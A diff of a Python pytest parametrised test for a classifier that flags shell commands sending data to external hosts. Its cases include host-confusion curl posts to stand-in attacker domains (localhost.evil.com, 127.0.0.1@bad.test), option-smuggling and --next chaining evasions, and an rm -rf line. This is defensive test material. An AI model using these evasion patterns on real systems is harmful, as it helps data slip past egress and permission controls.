@@ -60,8 +60,8 @@ REMOTE_POST = "curl -d @f https://api.example.com/v1/items"
         ("curl -x http://proxy.example.com:3128 -d x http://localhost/a", True),
         ("curl --resolve localhost:80:203.0.113.1 -d x http://localhost/a", True),
         ("curl -d x --url https://api.x", True),
-        ("curl -d x http://localhost.evil.com/a", True),
-        ("curl -d x http://127.0.0.1@evil.com/a", True),
+        ("curl -d x http://localhost.bad.test/a", True),
+        ("curl -d x http://127.0.0.1@bad.test/a", True),
         # Ordinary option values are not targets.
         ("curl --retry-delay 2 -d x http://127.0.0.1:31100/api", False),
         ("curl --retry-max-time 9 --limit-rate 1M -d x http://localhost/a", False),
@@ -73,6 +73,70 @@ REMOTE_POST = "curl -d @f https://api.example.com/v1/items"
         ("curl --retry-delay 2 -d x https://api.x/a", True),
         ("curl --some-new-option 5 -d x https://api.x/a", True),
         ("curl --some-new-option https://api.x -d x http://localhost/a", True),
+        # -G/--get sends the data as a query string: a remote GET is a read.
+        ("curl -G https://api.x/q --data-urlencode q=1", False),
+        ("curl --get https://api.x/q -d q=1", False),
+        ("curl -G -X POST https://api.x/q -d a=1", True),
+        ("curl --json '{}' https://api.x", True),
+        # Unparsed multi-line scripts: local GET queries are not external.
+        (
+            "python3 - <<'EOF'\nprint(1)\nEOF\n"
+            "curl -fsSG http://127.0.0.1:1/q --data-urlencode 'q={a=\"b\"}'",
+            False,
+        ),
+        (
+            "python3 - <<'EOF'\nprint(1)\nEOF\n"
+            "curl -fsS http://127.0.0.1:1/q --data-urlencode 'q=1'",
+            False,
+        ),
+        (
+            "python3 - <<'EOF'\nprint(1)\nEOF\n"
+            "curl -fsS https://api.x/q --data-urlencode 'q=1'",
+            True,
+        ),
+        ("cat <<EOF\nx\nEOF\ncurl -d x $URL", True),
+        # Option-like values are values, not flags.
+        ("curl --data '--get' https://api.example.com/items", True),
+        ("curl -d --get https://api.x/q", True),
+        ("curl -H 'X: -G' -d a https://api.x", True),
+        ("curl -XPOST https://api.x", True),
+        ("curl --request=PUT https://api.x", True),
+        # Each --next transfer has its own options.
+        ("curl -G https://api.x/read --next --data x https://api.x/items", True),
+        ("curl -G https://api.x/read -: -d x https://api.x/items", True),
+        ("curl -d x https://api.x/items --next -G https://api.x/read", True),
+        ("curl -G https://api.x/a -d q=1 --next -G https://api.x/b -d q=2", False),
+        ("curl --get --no-get --data x https://api.example.com/items", True),
+        ("curl --no-get --get --data x https://api.example.com/items", False),
+        (
+            "curl --get --no-get --get --data x https://api.example.com/items",
+            False,
+        ),
+        (
+            "curl --get --data q=1 https://api.example.com/read --next "
+            "--get --no-get --data x https://api.example.com/items",
+            True,
+        ),
+        (
+            "curl --no-get --data x https://api.example.com/items --next "
+            "--get --data q=1 https://api.example.com/read",
+            True,
+        ),
+        ("curl --data '--no-get' --get https://api.example.com/items", False),
+        # Unparsed commands never use visible local URLs as an exemption.
+        ('curl -d x "$URL" <<< http://localhost', True),
+        # Multi-line lists keep quoted newlines inside their argument.
+        (
+            "sleep 3\ncurl -fsSG http://127.0.0.1:1/q "
+            '--data-urlencode \'query={s="a"}\n|= "b"\'',
+            False,
+        ),
+        ("echo hi\n# git push origin main\nls", False),
+        ("echo hi \\\n  && git push", True),
+        # Subshells and groups run their contents.
+        ("(git push origin main)", True),
+        ("(cd repo && git push)", True),
+        ("{ rm -rf /tmp/x; }", True),
     ],
 )
 def test_local_network_targets_are_not_external(command, external):
